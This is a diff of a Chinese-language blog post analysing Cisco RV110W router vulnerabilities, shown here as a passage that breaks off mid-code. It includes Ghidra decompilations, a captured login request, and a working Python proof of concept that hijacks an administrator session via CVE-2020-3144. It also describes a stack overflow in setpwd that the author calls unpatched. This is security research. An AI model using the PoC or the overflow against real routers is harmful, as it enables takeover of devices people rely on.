@@ -7,15 +7,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | CataLpa&#39;s Home</title>
+  <title>Cisco RV110W 数个漏洞 | CataLpa&#39;s Home</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="CataLpa&#39;s Home">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="RV110W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cisco RV110W 数个漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/11/10/cisco-rv110w-bugs/index.html">
 <meta property="og:site_name" content="CataLpa&#39;s Home">
+<meta property="og:description" content="RV110W">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/img/rv110w-1.png">
+<meta property="og:image" content="http://yoursite.com/img/rv110w-2.png">
+<meta property="og:image" content="http://yoursite.com/img/rv110w-3.png">
+<meta property="og:image" content="http://yoursite.com/img/CVE-2020-3323-1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/CVE-2020-3323-2.png">
+<meta property="og:image" content="http://yoursite.com/img/CVE-2020-3323-3.png">
+<meta property="og:image" content="http://yoursite.com/img/CVE-2020-3323-4.png">
+<meta property="og:image" content="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22.svg">
+<meta property="og:image" content="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv.svg">
+<meta property="og:updated_time" content="2020-11-10T06:29:36.387Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CataLpa&#39;s Home">
+<meta name="twitter:title" content="Cisco RV110W 数个漏洞">
+<meta name="twitter:description" content="RV110W">
+<meta name="twitter:image" content="http://yoursite.com/img/rv110w-1.png">
   
     <link rel="alternative" href="/atom.xml" title="CataLpa&#39;s Home" type="application/atom+xml">
   
@@ -141,295 +155,311 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-cisco-rv110w-bugs" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      Cisco RV110W 数个漏洞
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/10/cisco-rv110w-bugs/" class="archive-article-date">
+
+        
+        <a href="/2020/11/10/cisco-rv110w-bugs/" class="archive-article-date">
   	<time datetime="2020-11-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-10</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/10/cisco-rv110w-bugs/">Cisco RV110W 数个漏洞</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>RV110W</p>
+<a id="more"></a>
 
-        <div class="article-info info-on-right">
-          
-          
+<h2 id="CVE-2020-3144"><a href="#CVE-2020-3144" class="headerlink" title="CVE-2020-3144"></a>CVE-2020-3144</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>Cisco 官方发布信息： <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ" target="_blank" rel="noopener">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ</a></p>
+<p>漏洞评分：9.8(<strong>Critical</strong>)</p>
+<p>漏洞描述：此漏洞位于 web 管理界面中，影响 Cisco RV110W，RV130 以及 RV215W 等设备。由于对 session 的管理存在问题，攻击者可以构造特殊格式的 HTTP 请求触发漏洞，成功的攻击可以使攻击者获取设备的管理员权限。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此漏洞在 1.2.2.8 版本中进行了修复。</p>
+<p>固件下载链接(请下载 1.2.2.8 以下版本)：<a href="https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8?catid=268437899" target="_blank" rel="noopener">https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8?catid=268437899</a></p>
+<p>binwalk 可以顺利的解压固件，得到一个标准的嵌入式 Linux 文件系统。</p>
+<p><img src="/img/rv110w-1.png" alt></p>
+<p>漏洞在处理 http 请求的文件中，文件路径：/usr/sbin/httpd。它是一个 MIPS32 小端序的二进制文件，直接使用 Ghidra 打开。</p>
+<p>关键函数位于 log_in_cgi 中，此函数主要实现用户登录的逻辑，函数代码稍长，关键部分如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="built_in">strcmp</span>(__s1_00,<span class="string">"continue"</span>);</span><br><span class="line"><span class="keyword">if</span> (enc == <span class="number">0</span>) &#123;</span><br><span class="line">  nvram_unset(<span class="string">"tmp_auth_key"</span>);</span><br><span class="line">  user = (undefined *)nvram_get(<span class="string">"session_key"</span>);</span><br><span class="line">  <span class="keyword">if</span> (user == (undefined *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    user = &amp;DAT_00487eb0;</span><br><span class="line">  &#125;</span><br><span class="line">  set_key_status(user,<span class="string">"drop"</span>);</span><br><span class="line">  set_login_info(param_1,local_30);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
 
+<p>__s1_00 变量由 get_cgi 函数返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method = (char *)get_cgi(&quot;submit_type&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>经过抓包发现 get_cgi 函数用于获取用户发送请求中的字段，submit_type 是用户提交请求的类型，登录的时候主要有两种类型，一是 set_lang，用于设置语言，二是 continue，这是我们需要关注的请求。</p>
+<p>那么 continue 是什么功能呢？如果有设备的话就很好验证了，打开 web 管理界面如下</p>
+<p><img src="/img/rv110w-2.png" alt></p>
+<p>此时可以正常登录管理员账户(默认用户名密码为 cisco:cisco)，成功登录后如果没有主动登出，只是简单的关闭了网页，后台的管理员账户是不会自动登出的，此时再发起一个新的登录请求，会看到如下界面</p>
+<p><img src="/img/rv110w-3.png" alt></p>
+<p>开启抓包，点击 continue，得到请求如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://192.168.1.1/login.cgi</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">submit_button=login&amp;submit_type=continue&amp;gui_action=gozila_cgi&amp;next_page=&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=&amp;pwd=&amp;sel_lang=EN</span><br></pre></td></tr></table></figure>
+
+<p>此时 submit_type 就是 continue，根据代码来看，当用户发送了 continue 请求的时候，并且当前 nvram 中的 session_key 字段不为空，就直接设置登录信息，不验证用户名和密码，并且这个请求不需要身份验证。</p>
+<p>所以如果我们能在真正的管理员发起登录请求和 continue 请求之间发送 continue 请求，就可以截获管理员的 session_id，从而获取后台管理权限。</p>
+<p>此漏洞的 POC 如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Code from https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"submit_button"</span>:<span class="string">"login"</span>,</span><br><span class="line">    <span class="string">"submit_type"</span>:<span class="string">"continue"</span>,</span><br><span class="line">    <span class="string">"gui_action"</span>:<span class="string">"gozila_cgi"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            <span class="string">"https://192.168.1.1/login.cgi"</span>,</span><br><span class="line">            data=payload,</span><br><span class="line">            verify=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Login Page"</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sessionid = re.findall(<span class="string">r"session_id=([^\"]+)"</span>, resp.content)[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"[+] Successfully hijacked admin session. Session id is</span></span><br><span class="line"><span class="string">            &#123;&#125;"</span>.format(sessionid))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：session_id 和登录者的 IP 具有对应关系，例如管理员从 ip 为 192.168.1.100 的机器上登录了路由器后台，攻击者从 ip 为 192.168.1.101 的机器上进行 session_id 劫持得到 session_id，但由于 ip 的绑定关系，他并不能直接从本机登录。</strong></p>
+<p><strong>所以，如果想要利用这个漏洞，只能将 IP 设置为和管理员机器相同，有几率可以正常向路由器发送 HTTP 报文。或者有更好的方法，欢迎评论指出。</strong></p>
+<h2 id="CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx"><a href="#CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx" class="headerlink" title="CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx"></a>CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><p>CVE-2020-3145 &amp; CVE-2020-3146 两个漏洞官方信息： <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX" target="_blank" rel="noopener">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX</a></p>
+<p>由于这些漏洞都位于后台，实际利用价值不大，所以我们以一个为例分析。</p>
+<p>3145 和 3146 两个漏洞的分析可以在<a href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" target="_blank" rel="noopener">这里</a>找到(感谢作者)，我们要分析的是一个此前没有被披露的漏洞，并且在最新版中也存在(1.2.2.8)。</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这些后台漏洞成因基本相同，都是对用户提交的数据验证不严格导致的。我们分析的漏洞位于函数 save_http_user (1.2.2.8)，Ghidra 可以直接进行反编译，结果如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined4 <span class="title">save_http_user</span><span class="params">(undefined4 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined4 uVar3;</span><br><span class="line">  <span class="keyword">char</span> *__s;</span><br><span class="line">  undefined4 *__s1;</span><br><span class="line">  undefined4 *__s1_00;</span><br><span class="line">  undefined1 *puVar4;</span><br><span class="line">  <span class="keyword">int</span> iVar5;</span><br><span class="line">  undefined local_c8;</span><br><span class="line">  undefined auStack199 [<span class="number">49</span>];</span><br><span class="line">  undefined auStack150 [<span class="number">50</span>];</span><br><span class="line">  undefined auStack100 [<span class="number">52</span>];</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  </span><br><span class="line">  __s1_00 = (undefined4 *)get_cgi(<span class="string">"enadmin"</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1_00 == (undefined4 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1_00 = &amp;DAT_0047c3f8;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = (undefined4 *)get_cgi(<span class="string">"enguest"</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (undefined4 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = &amp;DAT_0047c3f8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;local_c8,<span class="number">0</span>,<span class="number">0x96</span>);</span><br><span class="line">  local_c8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack199,<span class="number">0</span>,<span class="number">0x31</span>);</span><br><span class="line">  puVar4 = (undefined1 *)get_cgi(<span class="string">"en_guest"</span>);</span><br><span class="line">  <span class="keyword">if</span> (puVar4 == (undefined1 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    puVar4 = &amp;DAT_00486160;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)__s1_00,<span class="string">"on"</span>);</span><br><span class="line">  iVar5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    local_2c = get_cgi(<span class="string">"admin_name"</span>);</span><br><span class="line">    uVar2 = get_cgi(<span class="string">"admin_old_pwd"</span>);</span><br><span class="line">    uVar3 = get_cgi(<span class="string">"admin_new_pwd"</span>);</span><br><span class="line">    __s = (<span class="keyword">char</span> *)nvram_get(<span class="string">"http_user0"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      __s = <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sscanf</span>(__s,<span class="string">"%[^,],%[^,],%[^\n]"</span>,&amp;local_c8,auStack150,auStack100);</span><br><span class="line">    iVar5 = setpwd(<span class="number">0</span>,local_2c,auStack150,uVar2,uVar3,&amp;local_c8);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)__s1,<span class="string">"on"</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    guest_name = get_cgi(<span class="string">"guest_name"</span>);</span><br><span class="line">    uVar2 = get_cgi(<span class="string">"guest_old_pwd"</span>);</span><br><span class="line">    uVar3 = get_cgi(<span class="string">"guest_new_pwd"</span>);</span><br><span class="line">    __s = (<span class="keyword">char</span> *)nvram_get(<span class="string">"http_user1"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      __s = <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sscanf</span>(__s,<span class="string">"%[^,],%[^,],%[^\n]"</span>,&amp;local_c8,auStack150,auStack100);</span><br><span class="line">    iVar1 = setpwd(<span class="number">1</span>,guest_name,auStack150,uVar2,uVar3,&amp;local_c8);</span><br><span class="line">    iVar5 = iVar5 + iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar5 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)__s1_00,<span class="string">"on"</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      logout(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    nvram_set(<span class="string">"en_guest"</span>,puVar4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    nvram_set(<span class="string">"en_guest"</span>,puVar4);</span><br><span class="line">    error_value = <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> error_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个功能是用于开启路由器的访客账户，开启之后访客也可以登录路由器进行一定的管理，有利于管理角色的分割。</p>
+<p>第 56 行之前的代码多次使用 get_cgi 函数获取用户提交请求中的数据，第 58 行调用了 setpwd 函数设置访客用户的密码，其中第二个参数是 guest_name，即用户提交的访客用户名。</p>
+<p>setpwd 函数的代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">uint <span class="title">setpwd</span><span class="params">(undefined4 param_1,undefined4 guest_name,<span class="keyword">char</span> *param_3,<span class="keyword">char</span> *param_4,undefined4param_5,</span></span></span><br><span class="line"><span class="function"><span class="params">           undefined4 param_6)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  undefined4 local_128;</span><br><span class="line">  undefined4 local_124;</span><br><span class="line">  undefined4 local_120;</span><br><span class="line">  undefined4 local_11c;</span><br><span class="line">  undefined4 local_118;</span><br><span class="line">  undefined4 local_114;</span><br><span class="line">  undefined4 local_110;</span><br><span class="line">  undefined4 local_10c;</span><br><span class="line">  undefined4 local_108;</span><br><span class="line">  undefined4 local_104;</span><br><span class="line">  undefined4 local_100;</span><br><span class="line">  undefined4 local_fc;</span><br><span class="line">  undefined4 local_f8;</span><br><span class="line">  undefined4 local_f4;</span><br><span class="line">  undefined4 local_f0;</span><br><span class="line">  undefined2 local_ec;</span><br><span class="line">  <span class="keyword">char</span> acStack234 [<span class="number">202</span>];</span><br><span class="line">  </span><br><span class="line">  local_11c = <span class="number">0</span>;</span><br><span class="line">  local_118 = <span class="number">0</span>;</span><br><span class="line">  local_114 = <span class="number">0</span>;</span><br><span class="line">  local_110 = <span class="number">0</span>;</span><br><span class="line">  local_10c = <span class="number">0</span>;</span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_104 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line">  local_fc = <span class="number">0</span>;</span><br><span class="line">  local_f8 = <span class="number">0</span>;</span><br><span class="line">  local_f4 = <span class="number">0</span>;</span><br><span class="line">  local_f0 = <span class="number">0</span>;</span><br><span class="line">  local_ec = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(acStack234,<span class="number">0</span>,<span class="number">200</span>);</span><br><span class="line">  local_120 = <span class="number">0x585872</span>;</span><br><span class="line">  local_128 = <span class="number">0x70747468</span>;</span><br><span class="line">  local_124 = <span class="number">0x6573755f</span>;</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)&amp;local_128,<span class="number">0xc</span>,<span class="string">"http_user%d"</span>,param_1);</span><br><span class="line">  iVar1 = <span class="built_in">strncmp</span>(param_3,<span class="string">"enc="</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(param_3,<span class="string">"enc=%s"</span>,&amp;local_11c);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_4,(<span class="keyword">char</span> *)&amp;local_11c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    md5_encode(param_3,&amp;local_11c);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_4,(<span class="keyword">char</span> *)&amp;local_11c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(acStack234,<span class="string">"%s,enc=%s,%s"</span>,param_6,param_5,guest_name);</span><br><span class="line">    nvram_set(&amp;local_128,acStack234);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (uint)(iVar1 != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以很明显的看到第 53 行使用 sprintf 函数将外部传入的参数拷贝到栈变量，其中最后一个参数就是我们关注的 guest_name 变量。(第五和第六个参数也可以导致溢出，不过选择最后一个参数可以减少干扰)</p>
+<p>如果传入一个超长的字符串，则可以触发栈溢出，结合 ROP 等技术可以实现任意代码执行。(攻击分析见下文)</p>
+<p><strong>另外，在函数 validate_guest_vlan 中也存在类似的问题，不过这些漏洞都属于后台漏洞，实际攻击中价值不是很大。</strong></p>
+<h2 id="CVE-2020-3323"><a href="#CVE-2020-3323" class="headerlink" title="CVE-2020-3323"></a>CVE-2020-3323</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><p>官方发布信息： <a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX" target="_blank" rel="noopener">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX</a></p>
+<p>漏洞评分：9.8(<strong>Critical</strong>)</p>
+<p>漏洞描述：此漏洞位于 web 管理界面中，影响 Cisco RV110W，RV130 以及 RV215W 等设备。未经授权的攻击者可以通过构造特殊格式的 HTTP 请求，触发此漏洞，从而导致未授权的任意代码执行。</p>
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此漏洞在 1.2.2.8 版本中进行了修复。</p>
+<p>2020 年强网杯的 IoT 项目攻击目标之一就是 RV110W，现场应该有队伍利用了这个 nDay 完成了攻击。</p>
+<p>此漏洞位于函数 guest_logout_cgi 中，Ghidra 反编译结果如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 